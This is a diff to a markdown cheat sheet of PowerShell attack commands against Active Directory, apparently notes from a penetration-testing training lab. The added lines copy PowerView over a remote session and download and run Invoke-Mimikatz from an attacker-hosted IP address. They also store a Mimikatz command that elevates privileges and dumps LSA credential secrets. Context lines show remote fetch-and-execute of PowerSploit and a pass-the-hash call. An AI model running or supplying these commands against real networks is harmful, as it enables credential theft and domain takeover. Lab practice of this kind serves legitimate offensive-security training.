@@ -50,11 +50,14 @@ Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
 Copy files
 ```powershell
 Copy-Item .\Invoke-MimikatzEx.ps1 \\dcorp-adminsrv.dollarcorp.moneycorp.local\c$\'Program Files'
+Copy-Item C:\Users\pastudent149\Documents\PowerView.ps1 -Destination .\PowerView.ps1 -FromSession $sessTo149
 ```
 
 Download
 ```powershell
 iex(iwr("https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1"))
+iex(iwr http://192.168.50.149/Invoke-Mimikatz.ps1)
+
 ```
 
 ```cmd
@@ -175,6 +178,12 @@ Invoke-Mimikatz -Command '"sekurlsa::pth /user:srvadmin /domain:dollarcorp.money
 
 
 #### Mimikatz
+
+Add content to file
+```powershell
+Add-Content IM.ps1 "Invoke-Mimikatz -Command 'privilege::debug token::elevate lsadump::lsa /patch' "
+```
+
 ```powershell
 iex (iwr http://172.16.100.X/Invoke-Mimikatz.ps1 -UseBasicParsing)
 ```
